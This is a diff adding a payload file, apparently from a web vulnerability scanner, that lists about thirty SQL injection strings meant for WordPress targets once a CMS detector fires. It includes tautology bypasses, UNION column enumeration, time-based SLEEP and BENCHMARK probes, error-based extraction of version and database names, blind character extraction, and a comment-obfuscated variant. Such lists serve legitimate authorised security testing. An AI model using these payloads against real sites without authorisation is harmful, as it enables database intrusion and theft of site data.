@@ -1,0 +1,32 @@
+# WordPress-focused SQL injection payloads
+# Used when CMS detector identifies WordPress
+' OR 1=1-- wp
+' OR '1'='1'-- wp
+') OR ('1'='1'-- wp
+" OR "1"="1" -- wp
+' AND 1=2-- wp
+' OR EXISTS(SELECT 1)-- wp
+' UNION SELECT NULL-- wp
+' UNION SELECT NULL,NULL-- wp
+' UNION SELECT NULL,NULL,NULL-- wp
+' UNION ALL SELECT NULL,NULL,NULL,NULL-- wp
+' ORDER BY 1-- wp
+' ORDER BY 2-- wp
+' ORDER BY 3-- wp
+' GROUP BY 1 HAVING 1=1-- wp
+' AND SLEEP(2)-- wp
+' OR IF(1=1,SLEEP(2),0)-- wp
+' OR BENCHMARK(100000,MD5(1))-- wp
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- wp
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- wp
+' AND (SELECT COUNT(*) FROM information_schema.tables)>0-- wp
+' OR EXISTS(SELECT 1 FROM information_schema.columns)-- wp
+-1 UNION SELECT NULL-- wp
+1 OR 1=1# wp
+0 OR 1=1-- wp
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>64-- wp
+' AND LENGTH((SELECT USER()))>0-- wp
+' AND (SELECT 1 FROM dual WHERE 1=1)-- wp
+' OR (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)-- wp
+' OR 'x'='x' /* wordpress */
+' /*!50000OR*/ 1=1-- wp
